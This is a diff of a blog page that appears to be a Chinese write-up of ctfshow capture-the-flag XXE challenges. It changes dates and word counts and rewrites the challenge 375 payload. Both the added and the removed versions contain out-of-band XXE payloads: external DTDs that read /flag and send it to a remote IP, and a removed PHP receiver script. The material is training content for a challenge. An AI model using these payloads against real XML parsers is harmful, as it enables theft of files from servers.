@@ -412,14 +412,14 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2022-04-16
+                    2022-09-06
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    331
+                    305
                 </div>
                 
 
@@ -488,25 +488,15 @@
 <h2 id="375"><a href="#375" class="headerlink" title="375"></a>375</h2><p>同上   原理相同的 payload 另种写法</p>
 <p>payload:</p>
 <pre class="line-numbers language-none"><code class="language-none">&lt;!DOCTYPE convert [ 
-&lt;!ENTITY % remote SYSTEM "http://82.156.168.16/xxe.xml"&gt;
+&lt;!ENTITY % remote SYSTEM "http://82.156.168.16/xxe.dtd"&gt;
 %remote;%int;%send;
 ]&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
 
-<p>xxe.xml</p>
-<pre class="line-numbers language-none"><code class="language-none">&lt;!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=file:///flag"&gt;
-&lt;!ENTITY % int "&lt;!ENTITY &amp;#37; send SYSTEM 'http://82.156.168.16/xxe.php?1=%file;'&gt;"&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<p>xxe.dtd</p>
+<pre class="line-numbers language-none"><code class="language-none">&lt;!ENTITY % file SYSTEM "file:///flag"&gt;
+&lt;!ENTITY % int "&lt;!ENTITY &amp;#37; send SYSTEM 'http://82.156.168.16:7777?p=%file;'&gt;"&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
-<p>xxe.php</p>
-<pre class="line-numbers language-none"><code class="language-none">&lt;?php
-  $content= $_GET['1'];
-  if(isset($content)){
-    file_put_contents('flag.txt',$content);
-  }
-  else {
-      echo 'nodata';
-  }
-?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
+<p><img src="/2022/01/22/ctfshow-xxe/image-20220906184448585.png" alt="image-20220906184448585"></p>
 <h2 id="376"><a href="#376" class="headerlink" title="376"></a>376</h2><p>编码绕过</p>
 <h2 id="377"><a href="#377" class="headerlink" title="377"></a>377</h2><pre class="line-numbers language-none"><code class="language-none">&lt;?xml version="1.0"?&gt;
 &lt;!DOCTYPE ANY [
@@ -1040,7 +1030,7 @@
             <br>
             
                 &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                        class="white-color">20.7k</span>
+                        class="white-color">20.8k</span>
             
             
             
